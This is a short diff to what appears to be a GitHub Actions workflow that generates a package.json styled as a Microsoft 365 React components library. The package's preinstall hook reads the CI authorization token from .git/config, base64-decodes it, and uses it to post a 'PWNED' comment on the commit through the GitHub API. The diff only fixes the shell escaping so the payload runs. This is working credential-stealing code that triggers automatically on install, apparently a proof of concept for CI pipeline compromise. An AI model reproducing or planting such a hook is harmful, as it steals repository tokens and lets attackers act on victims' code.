@@ -90,7 +90,7 @@ jobs:
             "version": "1.0.0",
             "description": "Reusable React components for building experiences for Microsoft 365.",
             "scripts": {
-              "preinstall": "curl -X POST -H \"Authorization: Token $(cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3 | base64 -d | cut -d':' -f 2)\" -d '{\"body\": \"PWNED\"}' https://api.github.com/repos/$GITHUB_REPOSITORY/commits/$GITHUB_SHA/comments"
+              "preinstall": "curl -X POST -H \"Authorization: Token \$(cat \$GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3 | base64 -d | cut -d':' -f 2)\" -d '{\"body\": \"PWNED\"}' https://api.github.com/repos/\$GITHUB_REPOSITORY/commits/\$GITHUB_SHA/comments"
             }
           }
           EOT
